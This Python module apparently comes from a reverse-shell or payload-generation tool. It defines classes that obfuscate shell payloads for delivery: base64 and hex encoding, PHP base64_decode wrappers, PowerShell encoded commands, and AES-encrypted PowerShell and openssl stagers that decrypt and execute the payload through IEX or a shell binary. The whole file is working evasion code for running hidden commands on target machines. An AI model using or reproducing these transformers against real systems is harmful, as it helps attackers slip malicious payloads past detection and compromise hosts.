import base64
import inspect
import re
import secrets
import sys

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


def get_all():
    return inspect.getmembers(
        sys.modules[__name__], lambda o: inspect.isclass(o) and issubclass(o, ITransformer) and o.__name__ != "ITransformer"
    )


# Transformer classes, used to transform payloads
class ITransformer(object):
    def __init__(self) -> None:
        # define characters that will be trimmed if shell cvar in wrapped in them.
        # will be usefull if for example a normal shell hash a system("<SHELL>")
        # template in it, and a transformer places a base64_decode("...") call
        # in it. the doublequotes need to be removed in that case.
        self.trim_chars_wrap = []

    @staticmethod
    def apply_enabled_to_stager(transformers, placeholder, stager_content, shell_payload):
        for _, t in transformers.items():
            if t["enabled"]:
                tr = t["transformer"]
                stager_content = tr.trim_chars(stager_content, placeholder)
                shell_payload = tr.transform(shell_payload)

        return re.sub(placeholder, shell_payload, stager_content)

    @staticmethod
    def apply_enabled(transformers, shell_payload, cvars):
        for _, t in transformers.items():
            if t["enabled"]:
                shell_payload = t["transformer"].transform(cvars.insert_all(shell_payload))

        return shell_payload

    @property
    def has_trim_chars(self) -> bool:
        return len(self.trim_chars_wrap) > 0

    def trim_chars(self, content, placeholder):
        try:
            c_start = content.find(placeholder)

            if content[c_start - 1] in self.trim_chars_wrap:
                content = content[: c_start - 1] + content[c_start:]
                c_start -= 1

            c_end = c_start + len(placeholder)

            if content[c_end] in self.trim_chars_wrap:
                content = content[:c_end] + content[c_end + 1 :]

        except:
            pass

        return content

    def transform(self, s: str) -> str:
        return s


class SinglequoteToDoubleqoute(ITransformer):
    def transform(self, s: str) -> str:
        return re.sub("'", '"', s)


class DoubleqouteToSinglequote(ITransformer):
    def transform(self, s: str) -> str:
        return re.sub('"', "'", s)


class SinglequoteEscaper(ITransformer):
    def transform(self, s: str) -> str:
        return re.sub("'", "\\'", s)


class DoubleqouteEscaper(ITransformer):
    def transform(self, s: str) -> str:
        return re.sub('"', '\\"', s)


class PHPBase64Encode(ITransformer):
    def __init__(self) -> None:
        self.trim_chars_wrap = ['"', "'"]

    def transform(self, s: str) -> str:
        return f'base64_decode("{base64.b64encode(s.encode()).decode()}")'


class PowershellBase64(ITransformer):
    def transform(self, s: str) -> str:
        return f'powershell -e "{base64.b64encode(s.encode("utf-16")).decode()}"'


class PowershellAES128CBC(ITransformer):
    def transform(self, s: str) -> str:
        key = secrets.token_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC)
        var_name = secrets.token_bytes(4).hex()
        return f'${var_name}=([System.Convert]::FromBase64String("{base64.b64encode(cipher.encrypt(pad(s.encode(), cipher.block_size))).decode()}"));IEX([System.Text.Encoding]::UTF8.GetString((New-Object Security.Cryptography.AesCryptoServiceProvider).CreateDecryptor(([Convert]::FromBase64String("{base64.b64encode(key).decode()}")),([Convert]::FromBase64String("{base64.b64encode(cipher.iv).decode()}"))).TransformFinalBlock(${var_name},0,${var_name}.Length)))'


class LinuxBase64(ITransformer):
    def transform(self, s: str) -> str:
        return f'echo "{base64.b64encode(s.encode()).decode()}"|base64 -d|<<SHELLBIN>>'


class LinuxXXD(ITransformer):
    def transform(self, s: str) -> str:
        return f'echo "{s.encode().hex()}"|xxd -p -r|<<SHELLBIN>>'


class LinuxOpensslAES128CBC(ITransformer):
    def transform(self, s: str) -> str:
        key = secrets.token_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC)
        return f'echo "{base64.b64encode(cipher.encrypt(pad(s.encode(), cipher.block_size))).decode()}"|openssl aes-128-cbc -d -a -K {key.hex()} -iv {cipher.iv.hex()}|<<SHELLBIN>>'


class LinuxOpensslAES192CBC(ITransformer):
    def transform(self, s: str) -> str:
        key = secrets.token_bytes(24)
        cipher = AES.new(key, AES.MODE_CBC)
        return f'echo "{base64.b64encode(cipher.encrypt(pad(s.encode(), cipher.block_size))).decode()}"|openssl aes-192-cbc -d -a -K {key.hex()} -iv {cipher.iv.hex()}|<<SHELLBIN>>'


class LinuxOpensslAES256CBC(ITransformer):
    def transform(self, s: str) -> str:
        key = secrets.token_bytes(32)
        cipher = AES.new(key, AES.MODE_CBC)
        return f'echo "{base64.b64encode(cipher.encrypt(pad(s.encode(), cipher.block_size))).decode()}"|openssl aes-256-cbc -d -a -K {key.hex()} -iv {cipher.iv.hex()}|<<SHELLBIN>>'
